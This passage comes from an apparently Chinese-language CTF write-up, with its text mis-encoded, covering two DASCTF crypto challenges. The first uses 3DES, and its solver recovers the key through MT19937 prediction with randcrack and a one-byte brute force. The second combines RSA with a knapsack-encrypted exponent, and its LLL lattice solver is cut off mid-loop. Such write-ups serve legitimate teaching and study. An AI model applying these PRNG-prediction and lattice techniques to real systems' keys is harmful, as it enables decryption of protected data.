class="hljs-number">2</span>) * <span class="hljs-number">8</span><br>xor =bytes_to_long(hint1)^bytes_to_long(K1)<br><span class="hljs-built_in">print</span>(xor)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Rand</span>():<br>    rseed = secrets.randbits(<span class="hljs-number">1024</span>)<br>    List1 = []<br>    List2 = []<br>    seed(rseed)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>        rand16 = getrandbits(<span class="hljs-number">16</span>)<br>        List1.append(rand16)<br>    seed(rseed)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">312</span>):<br>        rand64 = getrandbits(<span class="hljs-number">64</span>)<br>        List2.append(rand64)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;task.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> file:<br>        <span class="hljs-keyword">for</span> rand16 <span class="hljs-keyword">in</span> List1:<br>            file.write(<span class="hljs-built_in">hex</span>(rand16)+ <span class="hljs-string">&quot;\n&quot;</span>)<br>        <span class="hljs-keyword">for</span> rand64 <span class="hljs-keyword">in</span> List2:<br>            file.write(<span class="hljs-built_in">hex</span>((rand64 &amp; <span class="hljs-number">0xffff</span>) | ((rand64 &gt;&gt; <span class="hljs-number">32</span>) &amp; <span class="hljs-number">0xffff</span>) &lt;&lt; <span class="hljs-number">16</span>) + <span class="hljs-string">&quot;\n&quot;</span>)<br>Rand()<br><br>K2 = long_to_bytes(getrandbits(<span class="hljs-number">64</span>))<br>K3 = flag[:<span class="hljs-number">8</span>]<br><br>KEY = K1 + K2 + K3<br><br>IV=iv<br><br>IV1=IV[:<span class="hljs-built_in">len</span>(IV)//<span class="hljs-number">2</span>]<br>IV2=IV[<span class="hljs-built_in">len</span>(IV)//<span class="hljs-number">2</span>:]<br><br>digest1 = hashlib.sha512(IV1).digest().<span class="hljs-built_in">hex</span>()<br>digest2 = hashlib.sha512(IV2).digest().<span class="hljs-built_in">hex</span>()<br><br>digest=digest1+digest2<br>hint2=(bytes_to_long(IV)&lt;&lt;<span class="hljs-number">32</span>)^bytes_to_long(os.urandom(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bytes_to_long((digest.encode()))))<br><span class="hljs-built_in">print</span>(hint2)<br><br><br>mode = DES3.MODE_CBC<br>des3 = DES3.new(KEY, mode, IV)<br><br>pad_len = <span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(flag) % <span class="hljs-number">8</span><br>padding = <span class="hljs-built_in">bytes</span>([pad_len]) * pad_len<br>flag += padding<br><br>cipher = des3.encrypt(flag)<br><br><br>ciphertext=cipher.<span class="hljs-built_in">hex</span>()<br><span class="hljs-built_in">print</span>(ciphertext)<br><br><span class="hljs-comment"># 334648638865560142973669981316964458403</span><br><span class="hljs-comment"># 0x62343937373634656339396239663236643437363738396663393438316230353665353733303939613830616662663633326463626431643139323130616333363363326631363235313661656632636265396134336361623833636165373964343533666537663934646239396462323666316236396232303539336438336234393737363465633939623966323664343736373839666339343831623035366535373330393961383061666266363332646362643164313932313061633336336332663136323531366165663263626539613433636162383363616537396434353366653766393464623939646232366631623639623230353933643833</span><br><span class="hljs-comment"># 22078953819177294945130027344</span><br><span class="hljs-comment"># a6546bd93bced0a8533a5039545a54d1fee647007df106612ba643ffae850e201e711f6e193f15d2124ab23b250bd6e1</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>æ ¹æ®é¢˜ç›®åˆ†æï¼Œæˆ‘ä»¬çš„ä¸»è¦ç›®çš„æ˜¯æ ¹æ®å­˜åœ¨çš„æ¼æ´æ¢å¤$key$å’Œ$IV$</p><h2 id="Part1ï¼šæ¢å¤key"><a href="#Part1ï¼šæ¢å¤key" class="headerlink" title="Part1ï¼šæ¢å¤key"></a>Part1ï¼šæ¢å¤key</h2><h3 id="ï¼ˆ1ï¼‰æ¢å¤K1"><a href="#ï¼ˆ1ï¼‰æ¢å¤K1" class="headerlink" title="ï¼ˆ1ï¼‰æ¢å¤K1"></a>ï¼ˆ1ï¼‰æ¢å¤K1</h3><p>ä½¿ç”¨<code>long_to_bytes(xor)</code>å¯ä»¥å‘ç°ï¼Œå‰8ä¸ªå­—èŠ‚æ˜¯å››ç»„é‡å¤çš„ï¼Œç¬¦åˆ$hint1$çš„ç‰¹ç‚¹ï¼ŒçŒœæµ‹$K1$åº”è¯¥åªæœ‰8ä¸ªå­—èŠ‚ï¼Œå› æ­¤ä½¿ç”¨å‰å…«ä¸ªå­—èŠ‚å¼‚æˆ–ä¸Šå8ä¸ªå­—èŠ‚ä¾¿å¯ä»¥æ¢å¤$K1$</p><h3 id="ï¼ˆ2ï¼‰æ¢å¤K2"><a href="#ï¼ˆ2ï¼‰æ¢å¤K2" class="headerlink" title="ï¼ˆ2ï¼‰æ¢å¤K2"></a>ï¼ˆ2ï¼‰æ¢å¤K2</h3><p>å¯¹äºMT19937æäº¤624ä¸ª32bitæ•°ï¼Œä¾¿èƒ½å¤Ÿé¢„æµ‹åè¾¹çš„éšæœºæ•°ï¼Œä½†é¢˜ç›®ä¸­å¹¶æ²¡æœ‰ç›´æ¥ç»™å‡º624ä¸ª32bitæ•°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> rand16 <span class="hljs-keyword">in</span> List1:<br>    file.write(<span class="hljs-built_in">hex</span>(rand16)+ <span class="hljs-string">&quot;\n&quot;</span>)<br><span class="hljs-keyword">for</span> rand64 <span class="hljs-keyword">in</span> List2:<br>    file.write(<span class="hljs-built_in">hex</span>((rand64 &amp; <span class="hljs-number">0xffff</span>) | ((rand64 &gt;&gt; <span class="hljs-number">32</span>) &amp; <span class="hljs-number">0xffff</span>) &lt;&lt; <span class="hljs-number">16</span>) + <span class="hljs-string">&quot;\n&quot;</span>)<br></code></pre></td></tr></table></figure><p>å·²çŸ¥<code>List1</code>å’Œ<code>List2</code>éƒ½æ˜¯ä»å¤´å¼€å§‹ç”Ÿæˆçš„ï¼Œä¸”è¾“å‡ºåˆ°æ–‡ä»¶ä¸­çš„<code>list2</code>åºåˆ—æ˜¯ä¸å®Œæ•´çš„ï¼Œåªè¾“å‡ºäº†æ¯ä¸ª$rand64$çš„<code>[:16]</code>å’Œ<code>[32:48]</code>ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦æƒ³æƒ³åŠæ³•æ¢å¤å‡º624ä¸ª32bitæ•°<br><code>getrandbits(16)</code>çš„ç”Ÿæˆè§„åˆ™æ˜¯æ¯æ¬¡ç”Ÿæˆä¸€ä¸ª32bitæ•°ï¼Œå†ä»è¿™ä¸ª32bitæ•°ä¸­æˆªå–16ä½ä½œä¸ºç”Ÿæˆçš„éšæœºæ•°ã€‚<br>å› æ­¤<code>List1</code>å°±æ˜¯<code>List2</code>çš„ç¼ºå¤±éƒ¨åˆ†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ‹†åˆ†æ‹¼æ¥<code>List1</code>å’Œ<code>List2</code>å¾—åˆ°624ä¸ª32bitæ•°ã€‚</p><h3 id="ï¼ˆ3ï¼‰æ¢å¤K3"><a href="#ï¼ˆ3ï¼‰æ¢å¤K3" class="headerlink" title="ï¼ˆ3ï¼‰æ¢å¤K3"></a>ï¼ˆ3ï¼‰æ¢å¤K3</h3><p>K3ä¸º<code>flag[:8]</code>ï¼Œå·²çŸ¥å‰7ä¸ªå­—èŠ‚ä¸º<code>DASCTF&#123;</code>ï¼Œå› æ­¤çˆ†ç ´ä¸€ä¸ªå­—èŠ‚ä¾¿å¯ä»¥</p><h2 id="Part2ï¼šæ¢å¤IV"><a href="#Part2ï¼šæ¢å¤IV" class="headerlink" title="Part2ï¼šæ¢å¤IV"></a>Part2ï¼šæ¢å¤IV</h2><h3 id="ï¼ˆ1ï¼‰æ¢å¤IV1"><a href="#ï¼ˆ1ï¼‰æ¢å¤IV1" class="headerlink" title="ï¼ˆ1ï¼‰æ¢å¤IV1"></a>ï¼ˆ1ï¼‰æ¢å¤IV1</h3><p>$IV$å…±8ä¸ªå­—èŠ‚ï¼Œè€Œ$hint2$ä¸º$IV$å‘å·¦ç§»åŠ¨äº†4ä¸ªå­—èŠ‚ä¹‹åå’Œ8ä¸ªå­—èŠ‚çš„éšæœºå­—èŠ‚è¿›è¡Œå¼‚æˆ–ï¼Œè¯´æ˜é«˜4ä¸ªå­—èŠ‚ï¼Œå³$IV1$æœªå‚ä¸è¿ç®—ï¼Œ$hint2$çš„é«˜4ä¸ªå­—èŠ‚ä¾¿æ˜¯$IV1$</p><h3 id="ï¼ˆ2ï¼‰æ¢å¤IV2"><a href="#ï¼ˆ2ï¼‰æ¢å¤IV2" class="headerlink" title="ï¼ˆ2ï¼‰æ¢å¤IV2"></a>ï¼ˆ2ï¼‰æ¢å¤IV2</h3><p>æ ¹æ®ï¼ˆ1ï¼‰ç®—å‡ºçš„$IV1$å¯ä»¥è®¡ç®—å‡º$digest1$ï¼ŒåŒæ—¶é¢˜ç›®ç»™å‡ºäº†$digest$ï¼Œåœ¨$digest$ä¸­å»é™¤$digest2$ä¹‹åä¾¿å‰©ä¸‹äº†$digest2$<br>ã€‚è™½ç„¶æˆ‘ä»¬è¿™é‡Œåªè·å¾—äº†$IV2$çš„å“ˆå¸Œå€¼ï¼Œå¯èƒ½éœ€è¦çˆ†ç ´ï¼Œä½†æ˜¯æ±‚å‡ºæ¥ä¹‹åæˆ‘ä»¬å‘ç°$digest2&#x3D;digest1$ï¼Œæˆ‘ä»¬é»˜è®¤ä¸å­˜åœ¨ç¢°æ’ï¼Œå³$IV2&#x3D;IV1$</p><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> randcrack <span class="hljs-keyword">import</span> RandCrack<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES3<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> xor<br><span class="hljs-keyword">import</span> hashlib<br><br>ciphertext = <span class="hljs-number">0xa6546bd93bced0a8533a5039545a54d1fee647007df106612ba643ffae850e201e711f6e193f15d2124ab23b250bd6e1</span><br><span class="hljs-comment">#æ¢å¤IV1å’ŒIV2</span><br>dig = <span class="hljs-number">0x62343937373634656339396239663236643437363738396663393438316230353665353733303939613830616662663633326463626431643139323130616333363363326631363235313661656632636265396134336361623833636165373964343533666537663934646239396462323666316236396232303539336438336234393737363465633939623966323664343736373839666339343831623035366535373330393961383061666266363332646362643164313932313061633336336332663136323531366165663263626539613433636162383363616537396434353366653766393464623939646232366631623639623230353933643833</span><br>dig_int = <span class="hljs-built_in">int</span>(dig)<br>dig0 = long_to_bytes(dig_int).decode()<br>hint2 = <span class="hljs-number">22078953819177294945130027344</span><br>IV1 = long_to_bytes(hint2&gt;&gt;<span class="hljs-number">64</span>)<br><span class="hljs-built_in">print</span>(IV1)<br>dig1 = hashlib.sha512(IV1).digest().<span class="hljs-built_in">hex</span>()<br><span class="hljs-keyword">if</span> dig1 == dig0[:<span class="hljs-built_in">len</span>(dig1)]:<br>    dig2 = dig0[<span class="hljs-built_in">len</span>(dig1):]<br><span class="hljs-comment">#print(dig2)</span><br>IV2 = IV1<br><br><span class="hljs-comment">#æ¢å¤K1</span><br>xor1 = <span class="hljs-number">334648638865560142973669981316964458403</span><br>xor_bytes = long_to_bytes(xor1)<br>K1 = xor(xor_bytes[:<span class="hljs-number">8</span>], xor_bytes[<span class="hljs-number">8</span>:])<br><span class="hljs-comment">#print(K1)</span><br><br><span class="hljs-comment">#æ¢å¤K2</span><br>rc = RandCrack()<br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;task.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>lines = file.readlines()<br>List1 = lines[:<span class="hljs-number">624</span>]<br>List2 = lines[<span class="hljs-number">624</span>:]<br><span class="hljs-comment">#print(List1)</span><br><span class="hljs-comment">#print(List2)</span><br>List22 = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> List2:<br>    val = <span class="hljs-built_in">int</span>(i.strip(),<span class="hljs-number">16</span>)<br>    low = val &amp; <span class="hljs-number">0xFFFF</span><br>    high = (val &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFF</span><br>    List22.append(low)<br>    List22.append(high)<br><span class="hljs-comment">#print(len(List22))</span><br>randlist = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>    val = <span class="hljs-built_in">int</span>(List1[i].strip(),<span class="hljs-number">16</span>)<br>    randlist.append(val &lt;&lt; <span class="hljs-number">16</span> | List22[i])<br>    rc.submit(randlist[i])<br>K2 = long_to_bytes(rc.predict_getrandbits(<span class="hljs-number">64</span>))<br><span class="hljs-comment">#print(K2)</span><br><br><span class="hljs-comment">#çˆ†ç ´K3å¹¶å°è¯•è§£å¯†</span><br>K3_t = bytes_to_long(<span class="hljs-string">b&#x27;DASCTF&#123;&#x27;</span>)&lt;&lt;<span class="hljs-number">8</span><br>IV = IV1 + IV2<br><span class="hljs-built_in">print</span>(IV)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">8</span>):<br>    K3 = long_to_bytes(K3_t + i)<br>    key = K1 + K2 + K3<br>    <span class="hljs-comment">#print(key)</span><br>    des3 = DES3.new(key, DES3.MODE_CBC, IV)<br>    decrypt = des3.decrypt(long_to_bytes(<span class="hljs-built_in">int</span>(ciphertext)))<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;DASCTF&#123;&#x27;</span> <span class="hljs-keyword">in</span> decrypt:<br>        <span class="hljs-built_in">print</span>(decrypt)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h1 id="MCeorpkpleer"><a href="#MCeorpkpleer" class="headerlink" title="MCeorpkpleer"></a>MCeorpkpleer</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pubkey</span>(<span class="hljs-params"><span class="hljs-built_in">list</span>, m, w</span>):<br>    pubkey_list = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(e_bin)):<br>        pubkey_list.append(w * <span class="hljs-built_in">list</span>[i] % m)<br>    <span class="hljs-keyword">return</span> pubkey_list<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">e_cry</span>(<span class="hljs-params">e, pubkey</span>):<br>    pubkey_list = pubkey<br>    encode = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(e)):<br>        encode += pubkey_list[i] * <span class="hljs-built_in">int</span>(e[i]) % m<br>    <span class="hljs-keyword">return</span> encode<br><br><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>e = getPrime(<span class="hljs-number">64</span>)<br>m = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br>e_bin = (<span class="hljs-built_in">bin</span>(e))[<span class="hljs-number">2</span>:]<br><span class="hljs-built_in">list</span> = [<span class="hljs-built_in">pow</span>(<span class="hljs-number">3</span>, i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(e_bin))]<br>m = getPrime(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">sum</span>(<span class="hljs-built_in">list</span>))) - <span class="hljs-number">1</span>)<br>w = getPrime(<span class="hljs-number">64</span>)<br>pubkey = pubkey(<span class="hljs-built_in">list</span>, m, w)<br>en_e = e_cry(e_bin, pubkey)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p = &#123;&#125;\n&#x27;</span><br>      <span class="hljs-string">&#x27;n = &#123;&#125;\n&#x27;</span><br>      <span class="hljs-string">&#x27;c = &#123;&#125;\n&#x27;</span><br>      <span class="hljs-string">&#x27;pubkey = &#123;&#125;\n&#x27;</span><br>      <span class="hljs-string">&#x27;en_e = &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>((p &gt;&gt; <span class="hljs-number">435</span>) &lt;&lt; <span class="hljs-number">435</span>, n, c, pubkey, en_e))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">p = 139540788452365306201344680691061363403552933527922544113532931871057569249632300961012384092481349965600565669315386312075890938848151802133991344036696488204791984307057923179655351110456639347861739783538289295071556484465877192913103980697449775104351723521120185802327587352171892429135110880845830815744</span><br><span class="hljs-string">n = 22687275367292715121023165106670108853938361902298846206862771935407158965874027802803638281495587478289987884478175402963651345721058971675312390474130344896656045501040131613951749912121302307319667377206302623735461295814304029815569792081676250351680394603150988291840152045153821466137945680377288968814340125983972875343193067740301088120701811835603840224481300390881804176310419837493233326574694092344562954466888826931087463507145512465506577802975542167456635224555763956520133324723112741833090389521889638959417580386320644108693480886579608925996338215190459826993010122431767343984393826487197759618771</span><br><span class="hljs-string">c = 156879727064293983713540449709354153986555741467040286464656817265584766312996642691830194777204718013294370729900795379967954637233360644687807499775502507899321601376211142933572536311131955278039722631021587570212889988642265055045777870448827343999745781892044969377246509539272350727171791700388478710290244365826497917791913803035343900620641430005143841479362493138179077146820182826098057144121231954895739989984846588790277051812053349488382941698352320246217038444944941841831556417341663611407424355426767987304941762716818718024107781873815837487744195004393262412593608463400216124753724777502286239464</span><br><span class="hljs-string">pubkey = [18143710780782459577, 54431132342347378731, 163293397027042136193, 489880191081126408579, 1469640573243379225737, 4408921719730137677211, 13226765159190413031633, 39680295477571239094899, 119040886432713717284697, 357122659298141151854091, 1071367977894423455562273, 3214103933683270366686819, 9642311801049811100060457, 28926935403149433300181371, 86780806209448299900544113, 260342418628344899701632339, 781027255885034699104897017, 2343081767655104097314691051, 7029245302965312291944073153, 21087735908895936875832219459, 63263207726687810627496658377, 189789623180063431882489975131, 569368869540190295647469925393, 1708106608620570886942409776179, 601827224419797931380408071500, 1805481673259393794141224214500, 893952418336266652976851386463, 2681857255008799958930554159389, 3523079163584485147344841221130, 1524252287869625983140881149316, 50264262166963219975822190911, 150792786500889659927466572733, 452378359502668979782399718199, 1357135078508006939347199154597, 4071405235524020818041597463791, 3169230503688232995231149877299, 462706308180869526799807117823, 1388118924542608580399421353469, 4164356773627825741198264060407, 3448085117999647764701149667147, 1299270151115113835209806487367, 3897810453345341505629419462101, 2648446157152195057994615872229, 3422845870014670444537026359650, 1223552407160181874717436564876, 3670657221480545624152309694628, 1966986461557807413563286569810, 1378466783231507511243038452393, 4135400349694522533729115357179, 3361215846199738142293703557463, 1038662335715384967987468158315, 3115987007146154903962404474945, 302975818554635252993570910761, 908927455663905758980712732283, 2726782366991717276942138196849, 3657854499533237101379593333510, 1928578295715881845245137486456, 1263242285705730806288591202331, 3789726857117192418865773606993, 2324195368467747797703678306905, 2450093503961328663664213663678, 2827787910442071261545819733997, 3960871129884299055190637944954, 2837628186769067706678271320788]</span><br><span class="hljs-string">en_e = 31087054322877663244023458448558</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>æ ¹æ®é¢˜ç›®ï¼Œå¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬éœ€è¦æ±‚$p_{low}$å’Œ$e$ï¼Œå…¶ä¸­$p_{low}$å¯ä»¥åˆ©ç”¨coppersmithå®šç†æ¥æ±‚è§£ã€‚<br>è€Œå¯¹äº$e$æ¥è¯´ï¼Œè§‚å¯Ÿ$e_cry$å‘ç°å®ƒæ˜¯å°†$e$çš„äºŒè¿›åˆ¶çš„æ¯ä¸€ä½ç”¨äºèƒŒåŒ…åŠ å¯†äº†ã€‚<br><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>en_e = <span class="hljs-number">31087054322877663244023458448558</span><br>nbits=<span class="hljs-number">64</span><br>pubkey = [<span class="hljs-number">18143710780782459577</span>, <span class="hljs-number">54431132342347378731</span>, <span class="hljs-number">163293397027042136193</span>, <span class="hljs-number">489880191081126408579</span>, <span class="hljs-number">1469640573243379225737</span>, <span class="hljs-number">4408921719730137677211</span>, <span class="hljs-number">13226765159190413031633</span>, <span class="hljs-number">39680295477571239094899</span>, <span class="hljs-number">119040886432713717284697</span>, <span class="hljs-number">357122659298141151854091</span>, <span class="hljs-number">1071367977894423455562273</span>, <span class="hljs-number">3214103933683270366686819</span>, <span class="hljs-number">9642311801049811100060457</span>, <span class="hljs-number">28926935403149433300181371</span>, <span class="hljs-number">86780806209448299900544113</span>, <span class="hljs-number">260342418628344899701632339</span>, <span class="hljs-number">781027255885034699104897017</span>, <span class="hljs-number">2343081767655104097314691051</span>, <span class="hljs-number">7029245302965312291944073153</span>, <span class="hljs-number">21087735908895936875832219459</span>, <span class="hljs-number">63263207726687810627496658377</span>, <span class="hljs-number">189789623180063431882489975131</span>, <span class="hljs-number">569368869540190295647469925393</span>, <span class="hljs-number">1708106608620570886942409776179</span>, <span class="hljs-number">601827224419797931380408071500</span>, <span class="hljs-number">1805481673259393794141224214500</span>, <span class="hljs-number">893952418336266652976851386463</span>, <span class="hljs-number">2681857255008799958930554159389</span>, <span class="hljs-number">3523079163584485147344841221130</span>, <span class="hljs-number">1524252287869625983140881149316</span>, <span class="hljs-number">50264262166963219975822190911</span>, <span class="hljs-number">150792786500889659927466572733</span>, <span class="hljs-number">452378359502668979782399718199</span>, <span class="hljs-number">1357135078508006939347199154597</span>, <span class="hljs-number">4071405235524020818041597463791</span>, <span class="hljs-number">3169230503688232995231149877299</span>, <span class="hljs-number">462706308180869526799807117823</span>, <span class="hljs-number">1388118924542608580399421353469</span>, <span class="hljs-number">4164356773627825741198264060407</span>, <span class="hljs-number">3448085117999647764701149667147</span>, <span class="hljs-number">1299270151115113835209806487367</span>, <span class="hljs-number">3897810453345341505629419462101</span>, <span class="hljs-number">2648446157152195057994615872229</span>, <span class="hljs-number">3422845870014670444537026359650</span>, <span class="hljs-number">1223552407160181874717436564876</span>, <span class="hljs-number">3670657221480545624152309694628</span>, <span class="hljs-number">1966986461557807413563286569810</span>, <span class="hljs-number">1378466783231507511243038452393</span>, <span class="hljs-number">4135400349694522533729115357179</span>, <span class="hljs-number">3361215846199738142293703557463</span>, <span class="hljs-number">1038662335715384967987468158315</span>, <span class="hljs-number">3115987007146154903962404474945</span>, <span class="hljs-number">302975818554635252993570910761</span>, <span class="hljs-number">908927455663905758980712732283</span>, <span class="hljs-number">2726782366991717276942138196849</span>, <span class="hljs-number">3657854499533237101379593333510</span>, <span class="hljs-number">1928578295715881845245137486456</span>, <span class="hljs-number">1263242285705730806288591202331</span>, <span class="hljs-number">3789726857117192418865773606993</span>, <span class="hljs-number">2324195368467747797703678306905</span>, <span class="hljs-number">2450093503961328663664213663678</span>, <span class="hljs-number">2827787910442071261545819733997</span>, <span class="hljs-number">3960871129884299055190637944954</span>, <span class="hljs-number">2837628186769067706678271320788</span>]<br>p_high = <span class="hljs-number">139540788452365306201344680691061363403552933527922544113532931871057569249632300961012384092481349965600565669315386312075890938848151802133991344036696488204791984307057923179655351110456639347861739783538289295071556484465877192913103980697449775104351723521120185802327587352171892429135110880845830815744</span><br>n = <span class="hljs-number">22687275367292715121023165106670108853938361902298846206862771935407158965874027802803638281495587478289987884478175402963651345721058971675312390474130344896656045501040131613951749912121302307319667377206302623735461295814304029815569792081676250351680394603150988291840152045153821466137945680377288968814340125983972875343193067740301088120701811835603840224481300390881804176310419837493233326574694092344562954466888826931087463507145512465506577802975542167456635224555763956520133324723112741833090389521889638959417580386320644108693480886579608925996338215190459826993010122431767343984393826487197759618771</span><br>c = <span class="hljs-number">156879727064293983713540449709354153986555741467040286464656817265584766312996642691830194777204718013294370729900795379967954637233360644687807499775502507899321601376211142933572536311131955278039722631021587570212889988642265055045777870448827343999745781892044969377246509539272350727171791700388478710290244365826497917791913803035343900620641430005143841479362493138179077146820182826098057144121231954895739989984846588790277051812053349488382941698352320246217038444944941841831556417341663611407424355426767987304941762716818718024107781873815837487744195004393262412593608463400216124753724777502286239464</span><br><br><span class="hljs-comment">#æ ¼åŸºè§„çº¦è§£èƒŒåŒ…å¯†ç æ±‚e</span><br>A=Matrix(ZZ,nbits+<span class="hljs-number">1</span>,nbits+<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(pubkey))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nbits):<br>    A[i,i]=<span class="hljs-number">2</span><br>    A[i,-<span class="hljs-number">1</span>]=pubkey[i]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nbits+<span class="hljs-number">1</span>):<br>    A[-<span class="hljs-number">1</span>,i]=<span class="hljs-number">1</span><br>A[-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>]=en_e<br>L=A.LLL()<br><span class="hljs-keyword">for</span> 